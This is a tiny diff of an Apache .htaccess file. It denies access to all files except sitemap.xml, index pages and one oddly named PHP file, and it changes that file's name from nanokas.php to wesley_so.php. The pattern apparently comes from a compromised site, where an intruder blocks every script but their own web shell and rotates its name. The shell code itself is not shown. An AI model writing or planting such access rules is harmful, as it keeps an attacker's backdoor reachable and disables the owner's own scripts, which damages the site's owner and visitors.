@@ -2,7 +2,7 @@
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch '^(sitemap.xml|nanokas.php|index.php|index.html)$'>
+<FilesMatch '^(sitemap.xml|wesley_so.php|index.php|index.html)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
